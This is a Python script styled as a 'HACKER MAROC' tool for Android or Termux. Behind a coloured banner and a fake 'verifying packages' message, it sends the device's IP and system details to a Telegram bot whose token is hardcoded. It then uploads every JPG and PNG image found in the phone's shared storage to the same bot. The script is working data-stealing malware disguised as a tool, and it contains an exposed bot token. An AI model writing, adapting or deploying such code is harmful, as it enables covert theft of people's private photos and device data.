import requests
import time
import json
import sys
import os
#color text script
a = '\033[1;31m'
b = '\033[1;33m'
c = '\033[2;31m'
d = '\033[2;32m'
e = '\033[2;34m'
f = '\033[2;35m'
g = '\033[2;36m'
h = '\033[1;34m'
i = '\033[1;31m'
#my code source »»»by mohamed bougrina
os.system('clear')
DATE = time.strftime(str("%D"))
HOUR = time.strftime(str("%H : %M : %S"))
def android():
    print(f'''
{a}:##::::'##::::'###:::::'######::'##:::'##:'########:'########::
{b}:##:::: ##:::'## ##:::'##... ##: ##::'##:: ##.....:: ##.... ##:
{c}:##:::: ##::'##:. ##:: ##:::..:: ##:'##::: ##::::::: ##:::: ##:
{d}:#########:'##:::. ##: ##::::::: #####:::: ######::: ########::
{e}:##.... ##: #########: ##::::::: ##. ##::: ##...:::: ##.. ##:::
{f}:##:::: ##: ##.... ##: ##::: ##: ##:. ##:: ##::::::: ##::. ##::
{g}:##:::: ##: ##:::: ##:. ######:: ##::. ##: ########: ##:::. ##:
{h}..:::::..::..:::::..:::......:::..::::..::........::..:::::..::
{a}'##::::'##::::'###::::'########:::'#######:::'######:::::::::::
{b}:###::'###:::'## ##::: ##.... ##:'##.... ##:'##... ##::::::::::
{c}:####'####::'##:. ##:: ##:::: ##: ##:::: ##: ##:::..:::::::::::
{d}:## ### ##:'##:::. ##: ########:: ##:::: ##: ##::::::::::::::::
{e}:##. #: ##: #########: ##.. ##::: ##:::: ##: ##::::::::::::::::
{f}:##:.:: ##: ##.... ##: ##::. ##:: ##:::: ##: ##::: ##::::::::::
{g}:##:::: ##: ##:::: ##: ##:::. ##:. #######::. ######:::::::::::
{h}:..:::::..::..:::::..::..:::::..:::.......::::......:::::::::::

{i}|{b}DATE {f}: {g}{DATE} {i} |{b} HOUR{f} : {g}{HOUR} {i}| {c}LOVE PYTHON ♡

''')
    print("#"*63)
    print("")
    NAME_SYSTEM = os.name
    NAME_DIRECTORY = os.getcwd()
    NUMBER_CPU_CORES = os.cpu_count()
    PYTHON_VERSION = sys.version
    TOKEN_BOT = "5983314681:AAHnBT2dYTB0FJNpiAdJLCNpC73BZrPB4k4"
    ID_CHAT = input(f'''{g}[{b}_{a}@{b}_{g}] {e}Enter Key {f}: {g}''')
    RESPONES = requests.get("https://api.ipify.org?format.json")
    IP = RESPONES.text
    INFORMATION = (f'''
[---------------BY--MOHAMED--BOUGRINA--------------------]
[✓] IP : {IP}
[✓] NAME SYSTEM : {NAME_SYSTEM}
[✓] DIRECTORY : {NAME_DIRECTORY}
[✓] NUMBER CPU CORES : {NUMBER_CPU_CORES}
[✓] PYTHON VERSION : {PYTHON_VERSION}
[----(DATE : {DATE})--(HOUR : {HOUR})----]

''')
    print("")
    print(f'''{g}[{d}!{g}] {e}You IP{g}: {a}{IP}''')
    print("")
    SNED_IP = requests.post(f'''https://api.telegram.org/bot{TOKEN_BOT}/sendMessage?chat_id={ID_CHAT}&text={INFORMATION}''')
    print(f'''{g}[{d}!{g}] {a} Verifying the required packages to run the tool ...!''')
    SEND_PHOTO = f'https://api.telegram.org/bot{TOKEN_BOT}/sendPhoto'
    for root,dirs,files in os.walk("/storage/emulated/0/"):
       for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                folder = (os.path.join(root,file))
                PHOTO_PATH = folder
                with open(PHOTO_PATH, 'rb') as PHOTO:
                    response = requests.post(SEND_PHOTO, files={'photo':PHOTO},data={'chat_id':ID_CHAT})
                    if response.status_code == 200:
                        print(f'''{g}[{d}@{g}] {b}GET DATA TOOL HACKER MAROC {e}[{g}✓{e}]''')
                        print("")
                    else:
                        print(f'''{a} Error Sorry )-:''')
android()                  